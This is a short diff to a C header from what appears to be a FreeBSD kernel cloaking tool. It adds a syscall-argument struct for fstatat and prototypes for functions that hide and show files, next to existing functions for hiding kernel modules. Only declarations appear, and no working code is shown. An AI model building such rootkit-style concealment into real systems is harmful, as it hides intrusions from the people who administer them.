@@ -8,10 +8,24 @@
 #ifndef ICLOAK_FREEBSD_INCANTATIONS_H
 #define ICLOAK_FREEBSD_INCANTATIONS_H 1
 
+/*
+struct fstatat_args {
+    int fd;
+    char *path;
+    struct stat *buf;
+    int flag;
+};
+*/
+#include <sys/sysproto.h>
+
 int native_icloak_ko(const char *name);
 
 int native_icloak_mk_ko_perm(const char *name, void **exit);
 
 int native_icloak_mk_ko_nonperm(const char *name, void *exit);
+
+int native_hide_file(const char *pattern);
+
+int native_show_file(const char *pattern);
 
 #endif
